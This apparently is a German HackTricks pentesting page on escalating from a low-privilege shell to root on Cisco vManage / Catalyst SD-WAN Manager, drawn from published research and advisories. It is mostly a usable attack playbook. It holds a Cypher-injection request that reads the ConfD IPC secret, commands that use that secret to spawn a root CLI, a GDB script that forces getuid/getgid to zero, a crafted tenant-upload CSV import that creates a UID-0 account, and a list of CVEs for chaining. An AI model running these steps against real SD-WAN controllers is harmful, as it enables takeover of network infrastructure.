# Cisco - vmanage

Sobald du Code-Ausführung auf Cisco vManage / *Catalyst SD-WAN Manager* als `vmanage`, `netadmin` oder `vmanage-admin` hast, sind die interessantesten lokalen privesc-Angriffsflächen normalerweise der `confd`-CLI-Stack, der `cmdptywrapper`-Helper, lokale REST-APIs und von root kontrollierte Import-/Upload-Handler.

Wenn du den **initial foothold** auf einem Controller noch benötigst, prüfe zuerst die dedizierte control-plane-Seite:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Schnelle lokale Triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Wenn `/etc/confd/confd_ipc_secret` von deinem foothold aus lesbar ist, werden Path 1 und Path 2 sofort praktikabel. Wenn du über eine Remote-File-Disclosure oder eine webshell Zugang erhältst, untersuche außerdem das SSH-Material von `vmanage-admin` und die Upload-Handler für Multitenancy; aktuelle Forschung hat beide als praktikable pivots demonstriert.<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Die vManage-Bewertung von Synacktiv dokumentiert diesen root-shell-Pfad.<sup>[[5]](#references)</sup>

Die im Bericht verlinkte [ConfD-Dokumentation](http://66.218.245.39/doc/html/rn03re18.html) beschreibt die IPC-Authentifizierung; ihr vManage-Beispiel legt das Secret unter `/etc/confd/confd_ipc_secret` ab und zeigt, dass es für `vmanage` lesbar ist.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Da Neo4j im gemeldeten Setup mit `vmanage`-Berechtigungen ausgeführt wird, kann die frühere Cypher injection die geheime Datei lesen.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` selbst akzeptiert keine Kommandozeilenargumente; es ruft `/usr/bin/confd_cli_user` auf. Der beschriebene Ablauf extrahiert diesen für root lesbaren Helper aus dem rootfs, kopiert ihn per `scp`, liest dessen Hilfe aus, setzt `CONFD_IPC_ACCESS_FILE` und ruft ihn mit `-U 0 -G 0` auf, um eine root-Shell zu erhalten.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Pfad 2

Diese alternative Route ist an die Forschung von Walmart Global Tech zu vManage 19.2.2 angelehnt.<sup>[[6]](#references)</sup>

Der Synacktiv-Pfad benötigt eine Kopie von `/usr/bin/confd_cli_user`, die im beschriebenen Setup für root lesbar ist; der Walmart-Bericht ändert stattdessen die Identitätswerte von `confd_cli` unter GDB.<sup>[[5]](#references)[[6]](#references)</sup>

Die Disassembly des Berichts zeigt, wie `confd_cli` die UID und GID des Aufrufers ermittelt.<sup>[[6]](#references)</sup>

<details>
<summary>Objdump zur Ermittlung von UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Derselbe Test zeigte, dass ein `cmdptywrapper` im Besitz von root explizite `-g`- und `-u`-Werte erhielt.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Der Forscher schloss daraus, dass `confd_cli` die UID und GID des angemeldeten Benutzers an `cmdptywrapper` weiterleitet.<sup>[[6]](#references)</sup>

Das direkte Ausführen von `cmdptywrapper` mit `-g 0 -u 0` schlug fehl, da der erforderliche File Descriptor (`-i 1015` im Beispiel) nicht verfügbar war.<sup>[[6]](#references)</sup>

Da `confd_cli` diese Werte nicht als Argumente bereitstellt, verwendet der Bericht GDB, um die Rückgabewerte von `getuid()` und `getgid()` zu überschreiben; GDB war auf diesem Appliance vorhanden.<sup>[[5]](#references)[[6]](#references)</sup>

Mit `vmanage`-Zugriff konnte der Test `/etc/confd/confd_ipc_secret` lesen; das folgende Skript erzwingt, dass beide Identitätsaufrufe null zurückgeben.<sup>[[6]](#references)</sup>

Das im Bericht verwendete GDB-Skript lautet:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Die gemeldete Konsolenausgabe lautet:<sup>[[6]](#references)</sup>

<details>
<summary>Konsolenausgabe</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Pfad 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco dokumentierte später in seinem eigenen Advisory für [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) einen saubereren lokalen Root-Pfad. Ein **authentifizierter Angreifer mit ausschließlich schreibgeschützten Berechtigungen** konnte aufgrund unzureichender input validation eine präparierte Anfrage an die Manager-CLI senden und Root-Rechte erlangen.<sup>[[7]](#references)</sup>

Aus offensiver Perspektive legen dieses Advisory und die frühere CLI-Forschung den folgenden Workflow nahe.<sup>[[6]](#references)[[7]](#references)</sup>

1. Sobald du *irgendeinen* low-priv-Foothold auf der Box hast, solltest du den lokalen CLI-Service testen, bevor du den umfangreicheren Workflow von Pfad 1 / Pfad 2 startest.
2. Verwende die Artefakte aus Pfad 2 erneut, um die Trust Boundary zu finden: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Behandle jedes an das CLI-Backend weitergeleitete Feld als verdächtig: UID/GID, Benutzername, Terminal-Metadaten, importierte Dateien oder jeden Wert, der später von einem Root-eigenen Helper verarbeitet wird.
4. Wenn ein Benutzer mit niedrigen Rechten den lokalen CLI-Socket erreichen und diese Felder beeinflussen kann, ist Root möglicherweise nur eine präparierte Anfrage entfernt.

Nachdem du auf der Appliance gelandet bist, untersuche die lokale CLI-Kette wie folgt.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Das macht den Bug von 2025 zu einem wiederverwendbaren Hunting-Pattern: Suche nach **lokalen CLI-shims, die Identitätsdaten im Userland sammeln und an einen privilegierten Wrapper weiterleiten**.<sup>[[6]](#references)[[7]](#references)</sup>

Verwechsle **CVE-2025-20122** nicht mit dem späteren **CVE-2026-20122**: Das Problem von 2025 ist ein *lokaler* CLI-to-root-Bug, während das Problem von 2026 ein *entferntes* Überschreiben beliebiger Dateien über die API ist, das hauptsächlich dazu dient, einen foothold zu platzieren und anschließend Path 1 / Path 2 / Path 4 erneut zu verfolgen.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Ciscos Advisory vom Februar 2026 beschreibt eine weitere nützliche Privesc-Klasse, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v). Ein **authentifizierter lokaler Angreifer mit niedrigen Berechtigungen** konnte aufgrund eines unzureichenden User-Authentifizierungsmechanismus in der REST API root erlangen.<sup>[[1]](#references)</sup>

Das ist relevant, weil vManage-Privesc nicht mehr auf `confd`-/TTY-Missbrauch beschränkt ist. Nach einer Low-Priv-Shell solltest du auch nach Folgendem suchen.<sup>[[1]](#references)</sup>

- Nur auf localhost erreichbare API-Endpunkte, die dem Aufrufer zu stark vertrauen
- Tokens, Cookies oder Service-Credentials, die vom aktuellen Account gelesen werden können
- Nur für root verfügbare Aktionen, die über `dataservice`-/REST-Handler offengelegt sind und weiterhin lokal ausgelöst werden können

Sobald du in der Praxis eine Shell als `vmanage` oder einen anderen Service-User hast, lässt sich lokaler API-Missbrauch oft leichter automatisieren als interaktiver CLI-Missbrauch.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Wenn der lokale Sitzungskontext ausreicht, um privilegierte REST-Funktionen aufzurufen, sollte der API-Pfad bevorzugt werden: Er lässt sich einfacher wiederholen, skripten und mit gestohlenen Web-Sitzungen oder API-Tokens verketten.<sup>[[1]](#references)</sup>

## Pfad 5 (2026: von `root` verarbeitete manipulierte Datei - CVE-2026-20245)

Ein weiteres aktuelles Muster ist [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx). Ein lokaler Angreifer mit `netadmin`-Berechtigungen konnte eine **manipulierte Datei** hochladen, die später von der CLI unsicher verarbeitet wurde, was zu Command Injection als `root` führte.<sup>[[2]](#references)</sup>

Aus Sicht von HackTricks ist die wertvolle Technik allgemeiner als die spezifische CVE.<sup>[[2]](#references)</sup>

1. Zähle jeden CLI- oder Web-Workflow auf, der eine Datei akzeptiert: Importe, Diagnose-Bundles, Templates, Validatoren, Backups, Tenant-Daten usw.
2. Verfolge, wo die hochgeladene Datei abgelegt wird und welches `root`-eigene Skript oder Binary sie verarbeitet.
3. Teste, ob der Dateiname, der Dateiinhalt oder geparste Metadaten jemals an Shell-Befehle, Wrapper-Skripte oder `system()`-artige Hilfsfunktionen übergeben werden.
4. Wenn du bereits `netadmin` erreichen kannst (gültige Zugangsdaten, gestohlene Sitzung oder eine Auth-Bypass-Kette), sind Fehler bei der Dateiverarbeitung oft der schnellste Weg zu `root`.

Google Cloud / Mandiant zeigte später ein konkretes Beispiel für die Ausnutzung dieser Fehlerklasse über den Multitenancy-Importpfad.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Beim beobachteten Angriff änderte die präparierte CSV-Datei `/etc/passwd` und `/etc/shadow`, um ein temporäres Konto mit UID 0 (`troot`) zu erstellen. Dadurch sind Importer im Stil von `tenant-upload` / `tenant-list` besonders interessant: Sie sind nicht nur Funktionen zur Datenaufnahme, sondern potenzielle Parser-Frontends mit Root-Berechtigungen.<sup>[[4]](#references)</sup>

Ein schnelles Hunting-Muster auf Shell-Ebene ist:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Diese Bug-Klasse lässt sich besonders gut mit Remote-Footholds kombinieren, die `netadmin`, aber nicht `root` gewähren.<sup>[[2]](#references)[[4]](#references)</sup>

## Weitere aktuelle vManage/Catalyst SD-WAN Manager-Vulnerabilities zum Chaining

- **Unauthenticated info leak (CVE-2026-20133)** – Besonders wertvoll, weil öffentliche Forschung gezeigt hat, dass dadurch `confd_ipc_secret` oder der private Schlüssel von `vmanage-admin` offengelegt werden könnte, wodurch ein Read-Bug entweder zu Path 1 oder einem NETCONF-Pivot wird.<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Anders als der oben genannte CLI-Bug von 2025; VulnCheck nutzte ihn zum Hochladen eines webshells, wodurch die lokalen privesc-Pfade auf dieser Seite unmittelbar relevant werden.<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – Ein authentifizierter Angreifer kann Script in der Weboberfläche eines betroffenen Benutzers ausführen; prüfe, ob der resultierende Session-Kontext API-/CLI-Aktionen offenlegt, die `vshell` oder einen der oben genannten lokalen privesc-Pfade erreichen.<sup>[[9]](#references)</sup>
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Ein sehr starker Vorläufer für Path 5, weil `netadmin` genau die für den crafted-file-privesc von 2026 erforderliche Berechtigungsstufe ist.<sup>[[2]](#references)[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – Ähnlicher offensiver Wert wie CVE-2026-20122, jedoch über einen späteren Web-UI-Upload-Pfad; Cisco sagt, dass eine durch den Bug erstellte oder überschriebene Datei später zur Rechteausweitung auf root verwendet werden könnte.<sup>[[10]](#references)</sup>
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Intrusionen im Jahr 2026 zeigten, dass Angreifer auf einen älteren verwundbaren SD-WAN-Build zurückgehen, den alten CLI-root-Bug ausnutzen und anschließend die ursprüngliche Version wiederherstellen können.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Auf der dedizierten SD-WAN-Control-Plane-Seite besser dokumentiert; dadurch kann ein SSH-Schlüssel für `vmanage-admin` hinzugefügt werden, was persistenten NETCONF-Zugriff für nachfolgende Management-Plane-Aktionen ermöglicht.<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Active exploitation of Cisco Catalyst SD-WAN by UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Cisco Catalyst SD-WAN Manager Arbitrary File Write Vulnerability (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Critical authentication bypass in Cisco Catalyst SD-WAN Controller](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
